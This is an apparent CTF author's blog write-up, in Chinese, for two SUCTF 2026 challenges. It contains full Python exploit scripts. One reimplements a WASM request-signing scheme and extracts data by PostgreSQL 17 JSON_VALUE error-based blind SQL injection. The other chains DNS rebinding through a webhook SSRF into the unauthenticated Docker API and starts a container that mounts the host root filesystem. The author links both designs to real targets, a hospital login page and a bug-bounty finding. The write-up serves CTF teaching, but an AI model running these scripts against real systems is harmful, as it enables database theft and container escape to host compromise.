+++
title= "SUCTF2026"
slug= "suctf-2026"
description= "欢迎大家来玩🙃"
date= "2026-03-13T17:24:55+08:00"
lastmod= "2026-03-13T17:24:55+08:00"
image= ""
license= ""
categories= ["CTF"]
tags= ["sqli","ssrf"]

+++

这是我第一次作为队长的身份组织大型比赛的出题，欢迎大家来玩，新平台有一些 bug，大家不要着急，赛宁大大正在修复～😘

赛后会在这里公开我出的两道题的 write-up，而且我们所有题目也应该会依据传统上传到 GitHub😉

## SU_sqli

这题就是两块：签名链路（JS + 双 WASM）和 PG17 JSON 报错注入。先把签名跑通，SQLi 才能打。

`GET /api/sign` 返回 `nonce/ts/seed/salt/algo`，`POST /api/query` 才能真正查询。

有两个坑：

- `User-Agent` 必须和拿 `sign` 时一致。
- `ts` 走 30 秒窗口，超时就要重拿一次。

SQL 拼接点在 `web_deploy/main.go`：

```go
sql := "SELECT id, title FROM posts WHERE status='public' AND title ILIKE '%" + req.Q + "%' LIMIT 20"
```

WAF 在 `web_deploy/internal/waf/waf.go`，关键字和长度（≤256）都卡住了。

### 签名链路

入口是 `application/app.js`。流程非常固定：

1. 拉 `/api/sign`
2. 组 `probe`
3. 调 `__suPrep`（WASM1）
4. JS 解扰 + 混合
5. 调 `__suFinish`（WASM2）

#### probe 组成

```
probe = "wd=<webdriver>;tz=<timezone>;b=<brands>;intl=<0/1>"
```

注意 `wd=1` 会直接进 decoy（`wasm1/main.go` 里 `isDebug`）。所以跑脚本要保证 `wd=0`，否则签名永远对不上。

#### WASM1：`__suPrep`

源码 `wasm1/main.go`。最关键的是 `seed_pack` 解包：

- `seed_pack` 是 4 段 base64，中间 `.` 分隔。
- 每段长度是 `8 + padL + padR`，pad 来自 `kdf(nonce|salt|bucket)`。
- 顺序由 `perm` 决定，数据再做 `mask[idx] + j*17` 的 XOR。

解包完之后就是：

```latex
k1  = kdf(nonce||ts||kConst, saltSeed)
dyn = uaMixKey(ua, salt, ts)
permuteInv(seedX)
secret  = seedX ^ dyn ^ k1
secret2 = secret ^ dyn
pre = scramble(secret2, nonce, ts)
```

`uaMixKey()` 也不是简单 hash：三个 KDF（不同 salt）+ rotate，再加一个假分支：

```latex
if len(ua)%7 == 3:
    mix ^= kdf("x|"+ua+"|"+salt)
```

`__suPrep` 里还塞了几个干扰：比如 `len(q)%3==2`、`tz`/`brands` 相关路径，都是为了浪费时间，不影响最终值。

#### JS glue

`application/app.js` 做了两件事：

- `unscramble(pre)`：逆 `scramble`（rot + XOR mask）。
- `mixSecret(secret2, probe)`：`probeMask` 触发 swap/rotate/xor。

这层是为了让 WASM1 单看也出不了最终 `secret2`。

#### WASM2：`__suFinish`

源码 `wasm2/main.go`。

```latex
secret2 = unmix(pre, probe)
m = kdf(method|path|q|ts|nonce, saltMsg)
sign = b64url(permute(secret2 ^ m))
```

这里也有假分支（`len(q)%5` / `len(q)%4`），不影响正常路径。

#### KDF 细节

`kdf` 的核心在 `kdfTable(salt, len(input))`。动态表 + FNV 风格迭代 + xorshift。尾部还会触发一次 `kdfTable` 的假调用做混淆，用和源码完全一致的实现即可。

### SQL 注入（PG17 JSON 报错）

WAF 把 `union/cast/::` 等老路封死了，但 PG17 有 `JSON_VALUE` 的强制转型报错

```sql
JSON_VALUE('{"a":"x"}','$.a' RETURNING INTEGER ERROR ON ERROR)
```

拼接点在字符串里，所以 payload 这样写

```sql
' || (SELECT CASE WHEN (<cond>)
     THEN JSON_VALUE('{"a":"x"}','$.a' RETURNING INTEGER ERROR ON ERROR)
     ELSE 0 END) || '
```

`ELSE 0` 这个点很关键，`CASE` 类型不一致会直接把你搞死，后面就是标准二分：

```sql
length((select flag from secrets limit 1)) > mid
ascii(substr((select flag from secrets limit 1), pos, 1)) > mid
```

### EXP

脚本在 `web_deploy/tools/exp.py`，逻辑就是：

- 先拿 `/api/sign` 物料
- 复现 `seed_pack` 解包 + dynKey + KDF
- 算 `sign`
- 用 JSON 报错二分出 flag

运行：

```bash
import base64
import json
import sys
import requests

BASE = "http://127.0.0.1:8080"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

SALT_SEED = 0xA3B1C2D3
SALT_MSG = 0x1F2E3D4C
SALT_UA = 0xB16B00B5
SALT_PERM = 0xC0DEC0DE
WINDOW_MS = 30000


def b64u_decode(s: str) -> bytes:
    pad = "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def rotl32(x: int, r: int) -> int:
    r %= 32
    return ((x << r) | (x >> (32 - r))) & 0xFFFFFFFF


def kdf_table(salt: int, n: int) -> list[int]:
    out = [0] * 16
    x = (salt ^ ((n * 0x9E3779B9) & 0xFFFFFFFF)) & 0xFFFFFFFF
    for i in range(16):
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5) & 0xFFFFFFFF
        out[i] = (x + (i * 0x85EBCA6B)) & 0xFFFFFFFF
    return out


def kdf(data: bytes, salt: int) -> bytes:
    tab = kdf_table(salt, len(data))
    h = (0x811C9DC5 ^ salt ^ tab[len(data) & 15]) & 0xFFFFFFFF
    for i, c in enumerate(data):
        h ^= (c + tab[i & 15]) & 0xFFFFFFFF
        h = (h * 0x01000193) & 0xFFFFFFFF
        if (tab[(i + 3) & 15] & 1) == 1:
            h ^= (h >> 13)
        if (tab[(i + 7) & 15] & 2) == 2:
            h = rotl32(h, tab[i & 15] & 7)
    x = (h ^ salt ^ tab[(len(data) + 7) & 15]) & 0xFFFFFFFF
    if (tab[1] & 4) == 4:
        x ^= rotl32(x, tab[2] & 15)
    out = bytearray(32)
    for i in range(8):
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= (x >> 17) & 0xFFFFFFFF
        x ^= (x << 5) & 0xFFFFFFFF
        x = (x + ((i * 0x9E3779B9) & 0xFFFFFFFF) + salt + tab[i & 15]) & 0xFFFFFFFF
        out[i * 4 : i * 4 + 4] = x.to_bytes(4, "little")
    if (tab[0] & 1) == 1:
        _ = kdf_table(salt ^ 0xA5A5A5A5, len(data) + 3)
    return bytes(out)


def rot_words(buf: bytes, r: int) -> bytes:
    out = bytearray(32)
    for i in range(8):
        w = int.from_bytes(buf[i * 4 : i * 4 + 4], "little")
        w = rotl32(w, r)
        out[i * 4 : i * 4 + 4] = w.to_bytes(4, "little")
    return bytes(out)


def xor32(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def permute(b: bytearray) -> None:
    for i in range(8):
        w = int.from_bytes(b[i * 4 : i * 4 + 4], "little")
        w = rotl32(w, (i * 7 + 3) % 31)
        b[i * 4 : i * 4 + 4] = w.to_bytes(4, "little")


def permute_inv(b: bytearray) -> None:
    for i in range(8):
        w = int.from_bytes(b[i * 4 : i * 4 + 4], "little")
        w = rotl32(w, -((i * 7 + 3) % 31))
        b[i * 4 : i * 4 + 4] = w.to_bytes(4, "little")


def ua_mix_key(ua: str, salt: str, ts: int) -> bytes:
    if not ua:
        ua = "ua/empty"
    bucket = str(ts // WINDOW_MS)
    msg_a = f"{ua}|{salt}|{bucket}".encode()
    msg_b = f"{bucket}|{salt}|{ua}".encode()
    msg_c = f"{ua}|{bucket}".encode()
    a = kdf(msg_a, SALT_UA)
    b = kdf(msg_b, SALT_UA ^ 0x13579BDF)
    c = kdf(msg_c, SALT_UA ^ 0x2468ACE0)
    mix = xor32(a, rot_words(b, 5))
    mix = xor32(mix, rot_words(c, 11))
    if len(ua) % 7 == 3:
        fake = kdf(f"x|{ua}|{salt}".encode(), 0xDEADBEEF)
        mix = xor32(mix, rot_words(fake, 7))
    return mix


def seed_pack_params(nonce: str, salt: str, ts: int):
    bucket = str(ts // WINDOW_MS)
    msg = f"{nonce}|{salt}|{bucket}".encode()
    k = kdf(msg, SALT_PERM)
    pad_l = [k[i] % 5 for i in range(4)]
    pad_r = [k[i + 4] % 5 for i in range(4)]
    mask = [k[i + 8] for i in range(4)]
    idx = [0, 1, 2, 3]
    pos = 12
    for i in range(3, 0, -1):
        j = k[pos] % (i + 1)
        idx[i], idx[j] = idx[j], idx[i]
        pos += 1
    return idx, pad_l, pad_r, mask


def unpack_seed(seed_pack: str, nonce: str, salt: str, ts: int) -> bytes:
    parts = seed_pack.split(".")
    if len(parts) != 4:
        raise ValueError("bad seed pack")
    perm, pad_l, pad_r, mask = seed_pack_params(nonce, salt, ts)
    chunks = [b"", b"", b"", b""]
    for i, p in enumerate(parts):
        b = b64u_decode(p)
        idx = perm[i]
        exp = pad_l[idx] + pad_r[idx] + 8
        if len(b) != exp:
            raise ValueError("bad chunk")
        data = bytearray(b[pad_l[idx] : pad_l[idx] + 8])
        for j in range(8):
            data[j] ^= (mask[idx] + (j * 17)) & 0xFF
        chunks[idx] = bytes(data)
    return b"".join(chunks)


def sign_request(method: str, path: str, q: str, nonce: str, ts: int, seed_pack: str, salt: str, ua: str) -> str:
    nb = b64u_decode(nonce)
    k1 = kdf(nb + ts.to_bytes(8, "little") + b"k9v3_suctf26_sigma", SALT_SEED)
    seed_x = bytearray(unpack_seed(seed_pack, nonce, salt, ts))
    dyn = ua_mix_key(ua, salt, ts)
    permute_inv(seed_x)
    seed = xor32(bytes(seed_x), dyn)
    secret = xor32(seed, k1)
    secret2 = xor32(secret, dyn)
    msg = f"{method}|{path}|{q}|{ts}|{nonce}".encode()
    m = kdf(msg, SALT_MSG)
    out = bytearray(xor32(secret2, m))
    permute(out)
    return b64u_encode(bytes(out))


def get_material(session: requests.Session) -> dict:
    r = session.get(f"{BASE}/api/sign", headers={"User-Agent": UA})
    r.raise_for_status()
    j = r.json()
    if not j.get("ok"):
        raise RuntimeError(j.get("error"))
    return j["data"]


def do_query(session: requests.Session, payload: str) -> tuple[int, dict]:
    mat = get_material(session)
    sig = sign_request("POST", "/api/query", payload, mat["nonce"], mat["ts"], mat["seed"], mat["salt"], UA)
    body = {"q": payload, "nonce": mat["nonce"], "ts": mat["ts"], "sign": sig}
    r = session.post(
        f"{BASE}/api/query",
        headers={"User-Agent": UA, "Content-Type": "application/json"},
        data=json.dumps(body),
    )
    try:
        data = r.json()
    except Exception:
        data = {"ok": False, "error": r.text}
    return r.status_code, data


TEMPLATES = [
    "' || (SELECT CASE WHEN ({cond}) THEN JSON_VALUE('{{\"a\":\"x\"}}','$.a' RETURNING INTEGER ERROR ON ERROR) ELSE 0 END) || '",
    "' || (SELECT CASE WHEN ({cond}) THEN JSON_VALUE('{{\"a\":\"x\"}}','$.a' RETURNING INTEGER ON ERROR ERROR) ELSE 0 END) || '",
]


def inj_payload(cond: str, template: str) -> str:
    return template.format(cond=cond)


def is_error(resp: tuple[int, dict]) -> bool:
    status, data = resp
    if status != 200:
        raise RuntimeError(f"HTTP {status}: {data}")
    if data.get("error") == "blocked":
        raise RuntimeError("WAF blocked payload")
    return not data.get("ok", False)


def pick_template(session: requests.Session) -> str:
    for tpl in TEMPLATES:
        p_true = inj_payload("1=1", tpl)
        p_false = inj_payload("1=0", tpl)
        if len(p_true) > 256:
            continue
        err_true = is_error(do_query(session, p_true))
        err_false = is_error(do_query(session, p_false))
        if err_true != err_false:
            return tpl
    raise RuntimeError("no working JSON error template")


def check_cond(session: requests.Session, cond: str, template: str) -> bool:
    payload = inj_payload(cond, template)
    if len(payload) > 256:
        raise RuntimeError("payload too long")
    return is_error(do_query(session, payload))


def get_length(session: requests.Session, template: str, max_len: int = 64) -> int:
    lo, hi = 1, max_len
    while lo <= hi:
        mid = (lo + hi) // 2
        cond = f"length((select flag from secrets limit 1))>{mid}"
        if check_cond(session, cond, template):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo


def get_char(session: requests.Session, template: str, pos: int) -> str:
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        cond = f"ascii(substr((select flag from secrets limit 1),{pos},1))>{mid}"
        if check_cond(session, cond, template):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)


def main():
    session = requests.Session()
    template = pick_template(session)
    length = get_length(session, template, max_len=96)
    out = []
    for i in range(1, length + 1):
        ch = get_char(session, template, i)
        out.append(ch)
        sys.stdout.write("\r" + "".join(out))
        sys.stdout.flush()
    print("\n")


if __name__ == "__main__":
    main()


# python3 tools/exp.py
```

### 小结

难点其实全在签名链路：WASM1 → JS glue → WASM2，尤其是 `seed_pack` 的变长块和动态表 KDF。签名复现之后，SQLi 就是标准 PG17 JSON 报错二分。

出题思路来源于某次和周师傅闲聊，说到四川省某医院的登录框是类似的设计，但是难度没这么大，而且逆向出签名之后也是直接就万能密码登录了

被AI打烂了，而且由于应用代码是AI写的，好像不用过签也能注入

## SU_uri

### 出题灵感

某次SRC挖掘，发现有一个SSRF到后台docker API未授权接管最后RCE的场景，但是实现是记不得前面如何SSRF了，就想的利用 DNS 重绑定攻击。

### EXP

由于是黑盒，所以测试的话大家测是能慢慢测的，这里我也测试一遍，一般这样的SSRF漏洞需要去探测到内网，主要能探测内网，后面的事情就比较简单了。

那么后面就是打一套docker API 未授权逃逸了，完整利用的EXP如下

```python
#!/usr/bin/env python3
import argparse
import json
import time
import uuid
from typing import Any, Dict, Tuple
import requests

def parse_host_port(value: str) -> Tuple[str, int]:
    if ":" not in value:
        raise argparse.ArgumentTypeError("value must be host:port")
    host, port_raw = value.rsplit(":", 1)
    if not host:
        raise argparse.ArgumentTypeError("host is empty")
    try:
        port = int(port_raw)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("port must be integer") from exc
    return host, port

def unique_rebind_host(root_domain: str) -> str:
    return f"{uuid.uuid4().hex}.{root_domain}"

def send_webhook(target_host: str, target_port: int, url: str, body: str, timeout: int = 20) -> Dict[str, Any]:
    endpoint = f"http://{target_host}:{target_port}/api/webhook"
    payload = {"url": url, "body": body}
    resp = requests.post(endpoint, json=payload, timeout=timeout)

    try:
        data = resp.json()
    except ValueError:
        data = {"message": "non-json webhook response", "target_body": resp.text}

    return {"status_code": resp.status_code, "json": data}

def post_via_rebind(
    target_host: str,
    target_port: int,
    root_domain: str,
    docker_path: str,
    body: str,
) -> Dict[str, Any]:
    host = unique_rebind_host(root_domain)
    rebinding_url = f"http://{host}:2375{docker_path}"
    print(f"[*] webhook -> {rebinding_url}")
    return send_webhook(target_host, target_port, rebinding_url, body)

def main() -> None:
    parser = argparse.ArgumentParser(description="CloudHook DNS-rebinding exploit")
    parser.add_argument("--target", required=True, type=parse_host_port)
    parser.add_argument(
        "--rebind-domain",
        default="rebind.baozongwi.xyz",
    )
    parser.add_argument(
        "--step-delay",
        type=float,
        default=1.7,
    )
    args = parser.parse_args()

    target_host, target_port = args.target

    print("[*] Stage 0: pull alpine:latest image")
    pull_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        "/images/create?fromImage=alpine:latest",
        "{}"
    )
    if pull_res["status_code"] != 200:
        print(f"[-] pull failed ({pull_res['status_code']}): {pull_res['json']}")
    else:
        print("[+] pull command sent, waiting 5 seconds for download...")
        time.sleep(5)

    create_payload = {
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c", "ln -s /mnt/flag /flag && /mnt/readflag"],
        "HostConfig": {"Binds": ["/:/mnt"]},
    }

    print("[*] Stage 1: create container")
    create_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        "/containers/create",
        json.dumps(create_payload),
    )
    if create_res["status_code"] != 200:
        print(f"[-] webhook error ({create_res['status_code']}): {create_res['json']}")
        return

    create_body = create_res["json"].get("target_body", "")
    try:
        container_id = json.loads(create_body)["Id"]
    except Exception:
        print(f"[-] failed to parse container ID from: {create_body}")
        return
    print(f"[+] container id: {container_id}")

    time.sleep(args.step_delay)

    print("[*] Stage 2: start container")
    start_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        f"/containers/{container_id}/start",
        "{}",
    )
    if start_res["status_code"] != 200:
        print(f"[-] start failed ({start_res['status_code']}): {start_res['json']}")
        return

    time.sleep(args.step_delay)

    print("[*] Stage 3: attach output")
    attach_res = post_via_rebind(
        target_host,
        target_port,
        args.rebind_domain,
        f"/containers/{container_id}/attach?logs=1&stream=0&stdout=1&stderr=1",
        "{}",
    )
    if attach_res["status_code"] != 200:
        print(f"[-] attach failed ({attach_res['status_code']}): {attach_res['json']}")
        return

    print("\n" + "=" * 40)
    print("FLAG OUTPUT:")
    print(attach_res["json"].get("target_body", ""))
    print("=" * 40)

if __name__ == "__main__":
    main()


# python SU_uri/exp/exp.py --target 127.0.0.1:8080 --rebind-domain ttt.rebind.baozongwi.xyz
```



可能一次不成功，需要多运行几次。

>https://lock.cmpxchg8b.com/rebinder.html
>
>https://en.wikipedia.org/wiki/DNS_rebinding
>
>https://baozongwi.xyz/p/dns-rebinding-attack/

